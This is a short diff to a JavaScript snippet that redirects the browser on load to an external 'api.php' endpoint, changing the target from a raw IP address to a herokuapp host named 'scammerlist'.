@@ -1,5 +1,5 @@
 function redirect() {
-    window.open('http://54.162.146.101/api.php', '_self')
+    window.open('https://scammerlist.herokuapp.com/api.php', '_self')
 }
 
 redirect()
